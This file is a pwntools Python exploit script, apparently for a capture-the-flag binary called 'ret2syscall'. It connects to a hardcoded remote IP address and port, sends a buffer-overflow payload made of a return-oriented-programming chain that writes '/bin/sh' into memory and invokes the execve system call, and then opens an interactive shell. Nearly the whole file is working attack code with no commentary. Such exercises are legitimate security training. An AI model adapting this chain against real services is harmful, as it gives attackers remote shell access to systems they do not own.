#!/usr/bin/python
# -*- coding: UTF-8 -*-

from pwn import *
from LibcSearcher import *

local = 0
os_level = 64
binary_name = 'ret2syscall'
remote_addr, port = '117.173.88.171:21198'.split(':')

if local:
    io = process('./' + binary_name)
    elf = ELF('./' + binary_name)
    # libc = e.libc
else:
    io = remote(remote_addr, port)
    elf = ELF('./' + binary_name)
    # libc = ELF(libc-2.23.so')

if os_level == 64:
    context(log_level='debug', os='linux', arch='amd64', bits=64)
elif os_level == 32:
    context(log_level='debug', os='linux', arch='i386', bits=32)
else:
    print('Error os!!!')
    exit()
context.terminal = ['/usr/bin/x-terminal-emulator', '-e']

#Main function
if __name__ == '__main__':
    #you can add your code here
    prax = 0x41f5b4
    prdi = 0x401656
    prsi = 0x401777
    prdx = 0x442a46
    syscall = 0x4003da
    main = elf.symbols['main']
    payload = b'a'*0x30 + b'b'*0x8
    payload += p64(prsi) + p64(0x00000000006ca080) + p64(prax) + b'/bin/sh\x00'
    payload += p64(0x00000000004743e1) + p64(prsi) + p64(0x00000000006ca088)
    payload += p64(0x000000000042620f) + p64(0x00000000004743e1) + p64(prdi)
    payload += p64(0x00000000006ca080) + p64(prsi) + p64(0x00000000006ca088)
    payload += p64(prdx) + p64(0x00000000006ca088) + p64(prax) + p64(0x3b)
    payload += p64(syscall)
    print(len(payload))
    io.send(payload)
    io.interactive()
